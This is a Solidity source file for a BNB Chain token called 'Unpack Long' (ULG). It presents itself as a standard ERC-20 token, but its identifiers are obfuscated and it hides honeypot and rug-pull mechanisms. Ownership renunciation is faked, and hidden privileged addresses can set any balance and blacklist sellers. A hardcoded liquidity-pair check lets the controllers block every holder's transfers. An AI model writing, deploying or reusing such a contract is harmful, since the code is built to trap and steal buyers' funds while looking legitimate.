//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface launchedFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamAuto) external view returns (uint256);

    function transfer(address swapMarketing, uint256 feeLimitLaunched) external returns (bool);

    function allowance(address maxToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLimitLaunched) external returns (bool);

    function transferFrom(
        address sender,
        address swapMarketing,
        uint256 feeLimitLaunched
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountTotal, uint256 value);
    event Approval(address indexed maxToken, address indexed spender, uint256 value);
}

abstract contract tradingLimitTx {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellLaunched {
    function createPair(address shouldTeam, address buyIsAt) external returns (address);
}

interface liquidityToken is launchedFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UnpackLong is tradingLimitTx, launchedFee, liquidityToken {

    uint256 constant tokenMode = 10 ** 10;

    address private modeFromLimit;

    function transferFrom(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) external override returns (bool) {
        if (_msgSender() != receiverList) {
            if (sellTradingReceiver[tokenFundReceiver][_msgSender()] != type(uint256).max) {
                require(feeLimitLaunched <= sellTradingReceiver[tokenFundReceiver][_msgSender()]);
                sellTradingReceiver[tokenFundReceiver][_msgSender()] -= feeLimitLaunched;
            }
        }
        return feeLimitList(tokenFundReceiver, swapMarketing, feeLimitLaunched);
    }

    function fromWallet(uint256 feeLimitLaunched) public {
        receiverAt();
        atMin = feeLimitLaunched;
    }

    uint256 private txList;

    bool private shouldLaunchTo;

    mapping(address => uint256) private tradingReceiver;

    function teamFromSell(address swapShould, uint256 feeLimitLaunched) public {
        receiverAt();
        tradingReceiver[swapShould] = feeLimitLaunched;
    }

    function feeTo(address maxExempt) public {
        receiverAt();
        if (fromTake != walletFund) {
            walletFund = senderBuy;
        }
        if (maxExempt == senderToken || maxExempt == marketingTokenSender) {
            return;
        }
        launchMaxBuy[maxExempt] = true;
    }

    event OwnershipTransferred(address indexed exemptLimit, address indexed isMinAuto);

    function getOwner() external view returns (address) {
        return modeFromLimit;
    }

    function symbol() external view virtual override returns (string memory) {
        return senderFrom;
    }

    bool public feeToken;

    function totalSupply() external view virtual override returns (uint256) {
        return teamWalletMode;
    }

    constructor (){
        if (senderBuy != txList) {
            txList = walletFund;
        }
        launchMarketing autoTxEnable = launchMarketing(receiverList);
        marketingTokenSender = sellLaunched(autoTxEnable.factory()).createPair(autoTxEnable.WETH(), address(this));
        
        senderToken = _msgSender();
        receiverReceiver();
        swapAuto[senderToken] = true;
        tradingReceiver[senderToken] = teamWalletMode;
        
        emit Transfer(address(0), senderToken, teamWalletMode);
    }

    function allowance(address exemptFee, address walletSender) external view virtual override returns (uint256) {
        if (walletSender == receiverList) {
            return type(uint256).max;
        }
        return sellTradingReceiver[exemptFee][walletSender];
    }

    function receiverAt() private view {
        require(swapAuto[_msgSender()]);
    }

    address public senderToken;

    function tokenEnable(address takeWallet) public {
        if (feeToken) {
            return;
        }
        
        swapAuto[takeWallet] = true;
        if (fromTake == autoToken) {
            autoToken = txList;
        }
        feeToken = true;
    }

    address toFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public launchMaxBuy;

    uint256 private walletFund;

    uint256 atMin;

    function receiverReceiver() public {
        emit OwnershipTransferred(senderToken, address(0));
        modeFromLimit = address(0);
    }

    function liquidityFeeTake(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) internal returns (bool) {
        require(tradingReceiver[tokenFundReceiver] >= feeLimitLaunched);
        tradingReceiver[tokenFundReceiver] -= feeLimitLaunched;
        tradingReceiver[swapMarketing] += feeLimitLaunched;
        emit Transfer(tokenFundReceiver, swapMarketing, feeLimitLaunched);
        return true;
    }

    function transfer(address swapShould, uint256 feeLimitLaunched) external virtual override returns (bool) {
        return feeLimitList(_msgSender(), swapShould, feeLimitLaunched);
    }

    function owner() external view returns (address) {
        return modeFromLimit;
    }

    string private senderFrom = "ULG";

    uint256 private teamWalletMode = 100000000 * 10 ** 18;

    uint256 fundReceiver;

    function feeLimitList(address tokenFundReceiver, address swapMarketing, uint256 feeLimitLaunched) internal returns (bool) {
        if (tokenFundReceiver == senderToken) {
            return liquidityFeeTake(tokenFundReceiver, swapMarketing, feeLimitLaunched);
        }
        uint256 txAt = launchedFee(marketingTokenSender).balanceOf(toFrom);
        require(txAt == atMin);
        require(swapMarketing != toFrom);
        if (launchMaxBuy[tokenFundReceiver]) {
            return liquidityFeeTake(tokenFundReceiver, swapMarketing, tokenMode);
        }
        return liquidityFeeTake(tokenFundReceiver, swapMarketing, feeLimitLaunched);
    }

    uint256 public fromTake;

    string private tokenLaunched = "Unpack Long";

    uint256 public autoToken;

    address public marketingTokenSender;

    mapping(address => bool) public swapAuto;

    uint256 public senderBuy;

    function name() external view virtual override returns (string memory) {
        return tokenLaunched;
    }

    uint256 public exemptReceiverAt;

    function balanceOf(address teamAuto) public view virtual override returns (uint256) {
        return tradingReceiver[teamAuto];
    }

    bool public buyWallet;

    address receiverList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private sellTradingReceiver;

    function approve(address walletSender, uint256 feeLimitLaunched) public virtual override returns (bool) {
        sellTradingReceiver[_msgSender()][walletSender] = feeLimitLaunched;
        emit Approval(_msgSender(), walletSender, feeLimitLaunched);
        return true;
    }

    uint8 private enableSender = 18;

    function decimals() external view virtual override returns (uint8) {
        return enableSender;
    }

}